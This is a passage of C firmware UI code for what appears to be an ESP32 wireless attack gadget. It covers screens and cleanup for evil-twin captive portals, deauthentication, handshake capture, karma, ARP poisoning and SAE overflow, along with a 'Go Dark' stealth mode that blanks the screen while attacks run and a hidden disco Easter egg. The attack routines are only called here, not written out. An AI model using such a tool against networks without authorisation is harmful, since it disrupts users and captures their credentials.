    lv_label_set_text(stop_label, "Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_label, ui_text_color(), 0);

    // Set UI active flag
    portal_ui_active = true;

    // Enable log capture and register event callback
    if (portal_enable_log_capture() != ESP_OK) {
        lv_textarea_add_text(portal_log_ta, "Failed to init event capture\n");
    }

    // Register event callback for portal events
    wifi_attacks_set_evil_twin_event_cb(portal_ui_event_callback);

    // Start portal
    esp_err_t start_res = wifi_attacks_start_portal(portal_ssid_buffer);
    if (start_res != ESP_OK) {
        char err[96];
        snprintf(err, sizeof(err), "Start failed: %s\n", esp_err_to_name(start_res));
        lv_textarea_add_text(portal_log_ta, err);
        portal_disable_log_capture();
        wifi_attacks_set_evil_twin_event_cb(NULL);
        portal_ui_active = false;
        return;
    }

    // Add initial "Portal Started" event
    lv_textarea_add_text(portal_log_ta, "Portal Started\n");
    lv_textarea_set_cursor_pos(portal_log_ta, LV_TEXTAREA_CURSOR_LAST);

    ESP_LOGI(TAG, "Portal started successfully");
}

static void portal_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Stopping Portal...");
    
    // Stop the portal
    wifi_attacks_stop_portal();
    
    // Unregister event callback
    wifi_attacks_set_evil_twin_event_cb(NULL);
    
    // Disable log capture
    portal_disable_log_capture();
    
    // Reset UI state
    portal_log_ta = NULL;
    portal_stop_btn = NULL;
    portal_info_ssid_label = NULL;
    portal_info_filename_label = NULL;
    portal_ui_active = false;
    
    // Navigate back to menu
    nav_to_menu_flag = true;
}

// ── Go Dark confirmation dialog ───────────────────────────────────────────────

static lv_obj_t *go_dark_confirm_overlay = NULL;

static void go_dark_confirm_yes_cb(lv_event_t *e)
{
    (void)e;
    if (go_dark_confirm_overlay) {
        lv_obj_del(go_dark_confirm_overlay);
        go_dark_confirm_overlay = NULL;
    }
    go_dark_enable();
}

static void go_dark_confirm_cancel_cb(lv_event_t *e)
{
    (void)e;
    if (go_dark_confirm_overlay) {
        lv_obj_del(go_dark_confirm_overlay);
        go_dark_confirm_overlay = NULL;
    }
}

static void show_go_dark_confirm(void)
{
    if (go_dark_confirm_overlay) return;  // already showing

    go_dark_confirm_overlay = lv_obj_create(lv_scr_act());
    lv_obj_set_size(go_dark_confirm_overlay, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(go_dark_confirm_overlay, 0, 0);
    style_modal_overlay(go_dark_confirm_overlay, LV_OPA_60);

    lv_obj_t *card = lv_obj_create(go_dark_confirm_overlay);
    lv_obj_set_size(card, 200, LV_SIZE_CONTENT);
    lv_obj_center(card);
    style_popup_card(card, 10, lv_color_hex(0x8A8FA8));
    lv_obj_set_style_pad_all(card, 14, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(card, 10, 0);

    lv_obj_t *title = lv_label_create(card);
    lv_label_set_text(title, LV_SYMBOL_POWER "  Go Dark");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, 0);

    lv_obj_t *hint = lv_label_create(card);
    lv_label_set_text(hint, "Screen & LED off.\nAll ops continue.\n\nDouble-click BOOT\nto resume.");
    lv_obj_set_style_text_color(hint, ui_muted_color(), 0);
    lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_align(hint, LV_TEXT_ALIGN_CENTER, 0);
    lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(hint, 170);

    lv_obj_t *btn_row = lv_obj_create(card);
    lv_obj_set_size(btn_row, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 72, 32);
    lv_obj_set_style_bg_color(cancel_btn, ui_panel_color(), 0);
    lv_obj_set_style_radius(cancel_btn, 6, 0);
    lv_obj_add_event_cb(cancel_btn, go_dark_confirm_cancel_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(cancel_lbl);

    lv_obj_t *yes_btn = lv_btn_create(btn_row);
    lv_obj_set_size(yes_btn, 72, 32);
    lv_obj_set_style_bg_color(yes_btn, lv_color_hex(0x8A8FA8), 0);
    lv_obj_set_style_bg_color(yes_btn, lv_color_hex(0xAAB0C0), LV_STATE_PRESSED);
    lv_obj_set_style_radius(yes_btn, 6, 0);
    lv_obj_add_event_cb(yes_btn, go_dark_confirm_yes_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *yes_lbl = lv_label_create(yes_btn);
    lv_label_set_text(yes_lbl, "Go Dark");
    lv_obj_set_style_text_color(yes_lbl, lv_color_white(), 0);
    lv_obj_set_style_text_font(yes_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(yes_lbl);
}

static void go_dark_mini_btn_cb(lv_event_t *e)
{
    (void)e;
    show_go_dark_confirm();
}

// ============================================================================
// DISCO MODE — secret Easter egg (tap Settings tile 5× rapidly)
// Le Freak / Chic — 120 BPM, 500ms per beat
// ============================================================================

static void settings_nav_timer_cb(lv_timer_t *t)
{
    lv_timer_del(t);
    settings_nav_timer = NULL;
    settings_tap_count = 0;
    show_settings_screen();
}

static void disco_task(void *arg)
{
    (void)arg;
    uint8_t beat = 0;

    while (disco_mode_active) {
        uint8_t c  = beat % DISCO_NC;
        uint8_t nc = (c + 1) % DISCO_NC;

        // ── Full beat: bright LED + screen flash ──────────────────────────
        disco_led_r = DISCO_LED_PAL[c].r;
        disco_led_g = DISCO_LED_PAL[c].g;
        disco_led_b = DISCO_LED_PAL[c].b;
        disco_led_needs_update = true;
        disco_color_idx   = c;
        disco_needs_update = true;

        // 3/4 beat = 370ms (37 × 10ms ticks — FreeRTOS at 100Hz, 1 tick = 10ms)
        for (int i = 0; i < 37 && disco_mode_active; i++)
            vTaskDelay(1);
        if (!disco_mode_active) break;

        // ── Offbeat: dim flash to next color (8th-note groove) ────────────
        disco_led_r = DISCO_LED_PAL[nc].r / 3;
        disco_led_g = DISCO_LED_PAL[nc].g / 3;
        disco_led_b = DISCO_LED_PAL[nc].b / 3;
        disco_led_needs_update = true;
        disco_color_idx   = nc;
        disco_needs_update = true;

        // 1/4 beat = 130ms (13 × 10ms ticks)
        for (int i = 0; i < 13 && disco_mode_active; i++)
            vTaskDelay(1);

        beat++;
    }

    // Signal LED off via main loop
    disco_led_r = 0; disco_led_g = 0; disco_led_b = 0;
    disco_led_needs_update = true;
    disco_needs_update = false;
    disco_task_handle  = NULL;
    vTaskDelete(NULL);
}

static void disco_post_pause_end(lv_timer_t *t)
{
    lv_timer_del(t);
    if (disco_screen_obj) {
        lv_obj_del(disco_screen_obj);
        disco_screen_obj = NULL;
    }
    for (int i = 0; i < 4; i++) disco_layers[i] = NULL;
    show_main_tiles();
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
}

static void disco_check_task_done(lv_timer_t *t)
{
    if (disco_task_handle != NULL) return;   // still running; poll again next tick
    lv_timer_del(t);
    lv_timer_create(disco_post_pause_end, 5000, NULL);
}

static void disco_touch_exit(lv_event_t *e)
{
    (void)e;
    if (!disco_mode_active) return;

    disco_mode_active = false;
    led_set(0, 0, 0);

    // Hide colour layers; leave disco_screen_obj as solid black
    for (int i = 0; i < 4; i++) {
        if (disco_layers[i]) lv_obj_add_flag(disco_layers[i], LV_OBJ_FLAG_HIDDEN);
    }
    lv_obj_set_style_bg_color(disco_screen_obj, lv_color_black(), 0);
    lv_obj_clear_flag(disco_screen_obj, LV_OBJ_FLAG_CLICKABLE);

    // Poll until task exits, then do the 5s post-pause
    lv_timer_create(disco_check_task_done, 50, NULL);
}

static void disco_pre_pause_end(lv_timer_t *t)
{
    lv_timer_del(t);

    // Four overlapping rounded blobs — tie-dye overlap in the centre
    // Positions kept within parent bounds (0,0)-(240,320) to avoid clipping
    static const struct { int16_t x, y, w, h; } BLOB[4] = {
        {  0,   0, 190, 210},   // top-left
        { 50,   0, 190, 210},   // top-right
        {  0, 110, 190, 210},   // bottom-left
        { 50, 110, 190, 210},   // bottom-right
    };
    for (int i = 0; i < 4; i++) {
        disco_layers[i] = lv_obj_create(disco_screen_obj);
        lv_obj_set_pos(disco_layers[i],  BLOB[i].x, BLOB[i].y);
        lv_obj_set_size(disco_layers[i], BLOB[i].w, BLOB[i].h);
        lv_obj_set_style_radius(disco_layers[i], 95, 0);
        lv_obj_set_style_bg_color(disco_layers[i],
            lv_color_make(DISCO_PALETTE[(i * 2) % DISCO_NC].r,
                          DISCO_PALETTE[(i * 2) % DISCO_NC].g,
                          DISCO_PALETTE[(i * 2) % DISCO_NC].b), 0);
        lv_obj_set_style_opa(disco_layers[i], LV_OPA_70, 0);
        lv_obj_set_style_border_width(disco_layers[i], 0, 0);
        lv_obj_clear_flag(disco_layers[i], LV_OBJ_FLAG_SCROLLABLE);
        // CRITICAL: blobs must not eat touch — let it fall through to disco_screen_obj
        lv_obj_clear_flag(disco_layers[i], LV_OBJ_FLAG_CLICKABLE);
    }

    // DeeDee on top — centered, transparent PNG (120×180)
    lv_obj_t *dd = lv_img_create(disco_screen_obj);
    lv_img_set_src(dd, &deedee_img);
    lv_obj_align(dd, LV_ALIGN_CENTER, 0, 0);
    lv_obj_clear_flag(dd, LV_OBJ_FLAG_CLICKABLE);

    // Touch anywhere on the background to exit (blobs are non-clickable so touch falls through)
    lv_obj_add_event_cb(disco_screen_obj, disco_touch_exit, LV_EVENT_CLICKED, NULL);

    disco_mode_active = true;
    xTaskCreate(disco_task, "disco_task", 4096, NULL, 1, &disco_task_handle);
}

static void show_disco_mode(void)
{
    // Take over the screen — hide instead of delete; we're inside a click event on a
    // tiles_container child, so deleting the parent here hangs the board.
    // show_main_tiles() will safely delete both when disco ends.
    if (settings_nav_timer) { lv_timer_del(settings_nav_timer); settings_nav_timer = NULL; }
    if (home_bg_img)     lv_obj_add_flag(home_bg_img,     LV_OBJ_FLAG_HIDDEN);
    if (tiles_container) lv_obj_add_flag(tiles_container, LV_OBJ_FLAG_HIDDEN);
    if (function_page)   { lv_obj_del(function_page);   function_page = NULL; }
    lv_obj_add_flag(title_bar, LV_OBJ_FLAG_HIDDEN);

    disco_screen_obj = lv_obj_create(lv_scr_act());
    lv_obj_set_size(disco_screen_obj, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(disco_screen_obj, lv_color_black(), 0);
    lv_obj_set_style_border_width(disco_screen_obj, 0, 0);
    lv_obj_set_style_radius(disco_screen_obj, 0, 0);
    lv_obj_set_style_pad_all(disco_screen_obj, 0, 0);
    lv_obj_clear_flag(disco_screen_obj, LV_OBJ_FLAG_SCROLLABLE);

    // 5-second black pre-pause, then start the show
    lv_timer_create(disco_pre_pause_end, 5000, NULL);
}

static void create_function_page_base(const char *name)
{
    // Print memory stats when opening new page
    print_memory_stats();
    
    evil_twin_disable_log_capture();
    evil_twin_log_ta = NULL;
    evil_twin_content = NULL;
    evil_twin_network_dd = NULL;
    evil_twin_html_dd = NULL;
    evil_twin_start_btn = NULL;
    evil_twin_status_label = NULL;
    evil_twin_ssid_label = NULL;
    evil_twin_deauth_list_label = NULL;
    evil_twin_status_list = NULL;
    wifi_attacks_set_evil_twin_event_cb(NULL);  // Unregister callback

    blackout_disable_log_capture();
    blackout_networks_label = NULL;
    blackout_status_label = NULL;
    blackout_stop_btn = NULL;
    blackout_ui_active = false;

    snifferdog_disable_log_capture();
    snifferdog_kick_label = NULL;
    snifferdog_recent_label = NULL;
    snifferdog_stop_btn = NULL;
    snifferdog_ui_active = false;

    sniffer_disable_log_capture();
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sniffer_start_btn = NULL;
    sniffer_packets_label = NULL;
    sniffer_aps_label = NULL;
    sniffer_probes_label = NULL;
    sniffer_ui_active = false;

    sae_overflow_disable_log_capture();
    sae_overflow_log_ta = NULL;
    sae_overflow_stop_btn = NULL;
    sae_overflow_ui_active = false;

    handshake_disable_log_capture();
    handshake_log_ta = NULL;
    handshake_stop_btn = NULL;
    handshake_status_list = NULL;
    handshake_ui_active = false;
    handshake_attack_active = false;
    handshake_attack_task_handle = NULL;

    wardrive_disable_log_capture();
    wardrive_log_ta = NULL;
    wardrive_stop_btn = NULL;
    wardrive_ui_active = false;

    karma_disable_log_capture();
    wifi_attacks_set_evil_twin_event_cb(NULL);  // Unregister karma event callback
    karma_log_ta = NULL;
    karma_stop_btn = NULL;
    karma_content = NULL;
    karma_probe_dd = NULL;
    karma_html_dd = NULL;
    karma_start_btn = NULL;
    karma_info_ssid_label = NULL;
    karma_info_filename_label = NULL;
    karma_ui_active = false;

    // Portal setup page cleanup
    portal_content = NULL;
    portal_ssid_ta = NULL;
    portal_html_dd = NULL;
    portal_start_btn = NULL;
    portal_keyboard = NULL;

    // Portal running page cleanup
    portal_disable_log_capture();
    portal_log_ta = NULL;
    portal_stop_btn = NULL;
    portal_info_ssid_label = NULL;
    portal_info_filename_label = NULL;
    portal_ui_active = false;

    // Rogue AP cleanup
    rogue_ap_content = NULL;
    rogue_ap_html_dd = NULL;
    rogue_ap_start_btn = NULL;
    rogue_ap_status_list = NULL;
    rogue_ap_html_count = 0;

    // ARP Poison cleanup
    stop_arp_ban();
    arp_poison_overlay = NULL;
    arp_poison_status_label = NULL;
    if (arp_scan_check_timer) {
        lv_timer_del(arp_scan_check_timer);
        arp_scan_check_timer = NULL;
    }

    if (function_page) {
        lv_obj_del(function_page);
        function_page = NULL;
    }
    reset_function_page_children();

    // Clean up home bg image when leaving a menu screen
    if (home_bg_img) {
        lv_obj_del(home_bg_img);
        home_bg_img = NULL;
    }

    // Hide tiles container and title bar while the function page is active
    if (tiles_container) {
        lv_obj_add_flag(tiles_container, LV_OBJ_FLAG_HIDDEN);
    }
    lv_obj_add_flag(title_bar, LV_OBJ_FLAG_HIDDEN);

    function_page = lv_obj_create(lv_scr_act());
    lv_obj_set_size(function_page, lv_pct(100), lv_pct(100));
    lv_obj_align(function_page, LV_ALIGN_CENTER, 0, 0);
    lv_obj_set_style_bg_color(function_page, ui_bg_color(), 0);
    lv_obj_set_style_border_width(function_page, 0, 0);
    lv_obj_set_style_radius(function_page, 0, 0);
    lv_obj_set_style_pad_all(function_page, 0, 0);

    lv_obj_t *page_title_bar = lv_obj_create(function_page);
    lv_obj_set_size(page_title_bar, lv_pct(100), 30);
    lv_obj_align(page_title_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(page_title_bar, ui_panel_color(), 0);
    lv_obj_set_style_border_width(page_title_bar, 0, 0);
    lv_obj_set_style_radius(page_title_bar, 0, 0);
    lv_obj_clear_flag(page_title_bar, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *home_btn = lv_btn_create(page_title_bar);
    lv_obj_set_size(home_btn, 30, 30);
    lv_obj_align(home_btn, LV_ALIGN_LEFT_MID, 0, 0);
    lv_obj_set_style_bg_color(home_btn, ui_accent_color(), 0);
    lv_obj_set_style_bg_color(home_btn, lv_color_lighten(ui_accent_color(), 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(home_btn, 5, 0);
    lv_obj_set_style_shadow_width(home_btn, 0, 0);
    lv_obj_add_event_cb(home_btn, home_btn_event_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *home_label = lv_label_create(home_btn);
    lv_label_set_text(home_label, LV_SYMBOL_HOME);
    lv_obj_set_style_text_font(home_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(home_label, ui_text_color(), 0);
    lv_obj_center(home_label);

    // Mini Go Dark button — power off screen without leaving the current op
    lv_obj_t *dark_btn = lv_btn_create(page_title_bar);
    lv_obj_set_size(dark_btn, 24, 24);
    lv_obj_align(dark_btn, LV_ALIGN_LEFT_MID, 34, 0);
    lv_obj_set_style_bg_color(dark_btn, lv_color_hex(0x0D1117), 0);
    lv_obj_set_style_bg_color(dark_btn, lv_color_hex(0x1A2332), LV_STATE_PRESSED);
    lv_obj_set_style_radius(dark_btn, 4, 0);
    lv_obj_set_style_shadow_width(dark_btn, 0, 0);
    lv_obj_add_event_cb(dark_btn, go_dark_mini_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *dark_lbl = lv_label_create(dark_btn);
    lv_label_set_text(dark_lbl, LV_SYMBOL_POWER);
    lv_obj_set_style_text_font(dark_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(dark_lbl, lv_color_hex(0x4A90D9), 0);
    lv_obj_center(dark_lbl);

    lv_obj_t *page_title_label = lv_label_create(page_title_bar);
    lv_label_set_text(page_title_label, name ? name : "");
    lv_obj_set_style_text_color(page_title_label, ui_text_color(), 0);
    // Constrain to space right of both left buttons (home 30px + dark btn 24px + gaps = 62px)
    lv_obj_set_width(page_title_label, 170);
    lv_obj_align(page_title_label, LV_ALIGN_LEFT_MID, 62, 0);
    lv_obj_set_style_text_align(page_title_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_label_set_long_mode(page_title_label, LV_LABEL_LONG_DOT);

    lv_obj_add_flag(page_title_label, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(page_title_label, screenshot_btn_event_cb, LV_EVENT_CLICKED, NULL);

    battery_label = lv_label_create(page_title_bar);
    lv_label_set_text(battery_label, last_voltage_str);
    lv_obj_set_style_text_color(battery_label, ui_muted_color(), 0);
    lv_obj_set_style_text_font(battery_label, &lv_font_montserrat_12, 0);
    lv_obj_align(battery_label, LV_ALIGN_RIGHT_MID, -8, 0);
    if (last_voltage_str[0] == '\0') lv_obj_add_flag(battery_label, LV_OBJ_FLAG_HIDDEN);
}

// ============================================================================
// Radio Reset: full WiFi/BT cleanup on every return to main menu
// ============================================================================

static void radio_reset_to_idle(void)
{
    ESP_LOGI(TAG, "radio_reset_to_idle: stopping all attacks, resetting radio...");

    // ---- 1. Component-level attacks (wifi_attacks module) ----
    wifi_attacks_stop_all();
    wifi_attacks_stop_evil_twin();

    // ---- 2. main.c-level attacks not covered by stop_all ----

    // Handshake
    if (handshake_attack_active) {
        g_operation_stop_requested = true;
        handshake_attack_active = false;
        attack_handshake_stop();
        TaskHandle_t h = handshake_attack_task_handle;
        if (h != NULL) {
            for (int i = 0; i < 30 && handshake_attack_task_handle != NULL; i++)
                vTaskDelay(pdMS_TO_TICKS(100));
            if (handshake_attack_task_handle != NULL) {
                vTaskDelete(handshake_attack_task_handle);
                handshake_attack_task_handle = NULL;
            }
        }
        handshake_cleanup();
    }

    // Sniffer
    if (sniffer_task_active) {
        sniffer_task_active = false;
        for (int i = 0; i < 30 && sniffer_task_handle != NULL; i++)
            vTaskDelay(pdMS_TO_TICKS(100));
    }

    // Snifferdog
    if (sniffer_dog_active) {
        sniffer_dog_active = false;
        for (int i = 0; i < 30 && sniffer_dog_task_handle != NULL; i++)
            vTaskDelay(pdMS_TO_TICKS(100));
    }

    // Wardrive
    if (wardrive_active) {
        wardrive_active = false;
        for (int i = 0; i < 10 && wardrive_task_handle != NULL; i++)
            vTaskDelay(pdMS_TO_TICKS(100));
        if (wardrive_task_handle != NULL) {
            vTaskDelete(wardrive_task_handle);
            wardrive_task_handle = NULL;
        }
    }

    // Targeted deauth
    targeted_deauth_active = false;
    if (targeted_deauth_timer) {
        lv_timer_del(targeted_deauth_timer);
        targeted_deauth_timer = NULL;
    }

    // Deauth rescan timer
    deauth_rescan_timer_stop();

    // Deauth monitor
    if (deauth_monitor_active) {
        deauth_monitor_active = false;
        esp_wifi_set_promiscuous(false);
        for (int i = 0; i < 20 && deauth_monitor_task_handle != NULL; i++)
            vTaskDelay(pdMS_TO_TICKS(100));
    }

    // ARP poison
    stop_arp_ban();

    // WPA-SEC upload
    wpasec_upload_active = false;

    // ---- 3. BLE cleanup ----
    if (current_radio_mode == RADIO_MODE_BLE) {
        bt_nimble_deinit();
        current_radio_mode = RADIO_MODE_NONE;
    }

    // ---- 4. WiFi reset ----
    if (!wifi_initialized || current_radio_mode == RADIO_MODE_NONE) {
        // WiFi driver was fully deinited (BLE switch or exit callback already ran);
        // reinitialize from scratch.
        ensure_wifi_mode();
    } else {
        // WiFi driver is alive — just cycle stop/start to clear AP, promisc, etc.
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        wifi_scanner_abort();   /* clear any stuck scan state before stop */
        esp_wifi_stop();
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
        vTaskDelay(pdMS_TO_TICKS(300));  // let STA task finish starting before scan is allowed
        apply_wifi_power_settings();

        wifi_country_t wifi_country = {
            .cc = "PH",
            .schan = 1,
            .nchan = 14,
            .policy = WIFI_COUNTRY_POLICY_AUTO,
        };
        esp_wifi_set_country(&wifi_country);

        current_radio_mode = RADIO_MODE_WIFI;
        wifi_initialized = true;
    }

    // ---- 5. Reset misc state ----
    g_operation_stop_requested = false;
    g_handshaker_global_mode = false;
    scan_done_ui_flag = false;
    sniffer_return_pending = false;

    ESP_LOGI(TAG, "radio_reset_to_idle: complete");
}

void show_menu(void)
{
    radio_reset_to_idle();

    evil_twin_log_capture_enabled = false;
    evil_twin_log_ta = NULL;
    evil_twin_ssid_label = NULL;
    evil_twin_deauth_list_label = NULL;
    evil_twin_status_list = NULL;
    wifi_attacks_set_evil_twin_event_cb(NULL);  // Unregister callback
    
    // Portal cleanup
    portal_disable_log_capture();
    portal_log_ta = NULL;
    portal_stop_btn = NULL;
    portal_info_ssid_label = NULL;
    portal_info_filename_label = NULL;
    portal_ui_active = false;
    
    // Rogue AP cleanup
    rogue_ap_status_list = NULL;
    rogue_ap_content = NULL;
    rogue_ap_html_dd = NULL;
    rogue_ap_start_btn = NULL;
    rogue_ap_html_count = 0;
    
    // ARP Poison cleanup
    stop_arp_ban();
    arp_poison_overlay = NULL;
    arp_poison_status_label = NULL;
    if (arp_scan_check_timer) {
        lv_timer_del(arp_scan_check_timer);
        arp_scan_check_timer = NULL;
    }
    
    // Delete function page if it exists
    if (function_page) {
        lv_obj_del(function_page);
        function_page = NULL;
    }
    reset_function_page_children();
    
    // Show main tiles and title bar
    show_main_tiles();
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
}

void show_function_page(const char *name)
{
    create_function_page_base(name);
    // Center text showing function name
    lv_obj_t *center_label = lv_label_create(function_page);
    lv_label_set_text(center_label, name);
    lv_obj_set_style_text_font(center_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(center_label, ui_text_color(), 0);
    lv_obj_center(center_label);
    
    // Logging removed to avoid VFS writes during draw
}

// ============================================================================
// TILE-BASED NAVIGATION SYSTEM
// ============================================================================

// Home button callback - sends UART reboot command and returns to main tiles
static void home_btn_event_cb(lv_event_t *e)
{
    (void)e;
    // Send "reboot" command via UART (GPS UART port)
    const char *reboot_cmd = "reboot\n";
    uart_write_bytes(GPS_UART_NUM, reboot_cmd, strlen(reboot_cmd));
    ESP_LOGI(TAG, "UART reboot command sent");
    
    // Navigate back to main tiles (radio_reset_to_idle called from show_menu)
    nav_to_menu_flag = true;
}

// Create a single tile button (accent param tints icon only; bg uses theme card color)
static lv_obj_t *create_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t accent, lv_event_cb_t callback, const char *user_data)
{
    lv_obj_t *tile = lv_btn_create(parent);
    lv_obj_set_size(tile, 70, 87);
    lv_obj_set_style_bg_color(tile, ui_card_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(tile, ui_card_pressed_color(), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(tile, 1, 0);
    lv_obj_set_style_border_color(tile, ui_border_color(), 0);
    lv_obj_set_style_border_opa(tile, dark_mode_enabled ? LV_OPA_40 : LV_OPA_80, 0);
    lv_obj_set_style_radius(tile, 12, 0);
    lv_obj_set_style_shadow_width(tile, 0, 0);
    lv_obj_set_flex_flow(tile, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(tile, 4, 0);
    lv_obj_set_style_pad_row(tile, 3, 0);

    if (icon) {
        lv_obj_t *icon_label = lv_label_create(tile);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_extra_symbols, 0);
        lv_obj_set_style_text_color(icon_label, accent, 0);
    }

    if (text) {
        lv_obj_t *text_label = lv_label_create(tile);
        lv_label_set_text(text_label, text);
        lv_obj_set_style_text_font(text_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(text_label, ui_text_color(), 0);
        lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_label_set_long_mode(text_label, LV_LABEL_LONG_DOT);
        lv_obj_set_width(text_label, 62);
    }

    if (callback && user_data) {
        lv_obj_add_event_cb(tile, callback, LV_EVENT_CLICKED, (void*)user_data);
    }

    return tile;
}

// Create a smaller tile button for compact layouts (accent tints icon only)
static lv_obj_t *create_small_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t accent, lv_event_cb_t callback, const char *user_data)
{
    lv_obj_t *tile = lv_btn_create(parent);
    lv_obj_set_size(tile, 72, 48);
    lv_obj_set_style_bg_color(tile, ui_card_color(), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(tile, ui_card_pressed_color(), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(tile, 1, 0);
    lv_obj_set_style_border_color(tile, ui_border_color(), 0);
    lv_obj_set_style_border_opa(tile, dark_mode_enabled ? LV_OPA_40 : LV_OPA_80, 0);
    lv_obj_set_style_radius(tile, 8, 0);
    lv_obj_set_style_shadow_width(tile, 0, 0);
    lv_obj_set_flex_flow(tile, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(tile, 4, 0);
    lv_obj_set_style_pad_row(tile, 2, 0);

    if (icon) {
        lv_obj_t *icon_label = lv_label_create(tile);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(icon_label, accent, 0);
    }

    if (text) {
        lv_obj_t *text_label = lv_label_create(tile);
        lv_label_set_text(text_label, text);
        lv_obj_set_style_text_font(text_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(text_label, ui_text_color(), 0);
        lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_label_set_long_mode(text_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(text_label, 68);
    }

    if (callback && user_data) {
        lv_obj_add_event_cb(tile, callback, LV_EVENT_CLICKED, (void*)user_data);
    }

    return tile;
}

// Main tile event callback - routes to appropriate screen
static void main_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    if (!tile_name) return;

    // Reset disco tap counter on any non-Settings tile
    if (strcmp(tile_name, "Settings") != 0) {
        settings_tap_count = 0;
        if (settings_nav_timer) {
            lv_timer_del(settings_nav_timer);
            settings_nav_timer = NULL;
        }
    }

    if (strcmp(tile_name, "WiFi Menu") == 0) {
        show_wifi_menu_screen();
    } else if (strcmp(tile_name, "WiFi Scan & Attack") == 0) {
        show_wifi_scan_attack_screen();
    } else if (strcmp(tile_name, "Global WiFi Attacks") == 0) {
        show_global_attacks_screen();
    } else if (strcmp(tile_name, "WiFi Sniff&Karma") == 0) {
        sniffer_yes_btn_cb(NULL);
    } else if (strcmp(tile_name, "Settings") == 0) {
        // Secret disco code: tap Settings 5 times rapidly
        if (settings_nav_timer) {
            lv_timer_del(settings_nav_timer);
            settings_nav_timer = NULL;
        }
        settings_tap_count++;
        if (settings_tap_count >= 5) {
            settings_tap_count = 0;
            show_disco_mode();
            return;
        }
        // Deferred navigation — fires if no follow-up tap within 800ms
        settings_nav_timer = lv_timer_create(settings_nav_timer_cb, 800, NULL);
    } else if (strcmp(tile_name, "Deauth Monitor") == 0) {
        show_deauth_monitor_screen();
    } else if (strcmp(tile_name, "Bluetooth") == 0) {
        show_bluetooth_screen();
    } else if (strcmp(tile_name, "Wardrive") == 0) {
        wardrive_start_btn_cb(NULL);
    } else if (strcmp(tile_name, "Go Dark") == 0) {
        show_go_dark_confirm();
    }
}

// Attack tile event callback - after selecting networks
static void attack_tile_event_cb(lv_event_t *e)
{
    const char *attack_name = (const char *)lv_event_get_user_data(e);
    if (!attack_name) return;
    
    // Route to existing attack handlers
    if (strcmp(attack_name, "Deauth") == 0) {
        // Redirect to "Deauther" handler in attack_event_cb with a synthetic event
        lv_event_t synthetic_event;
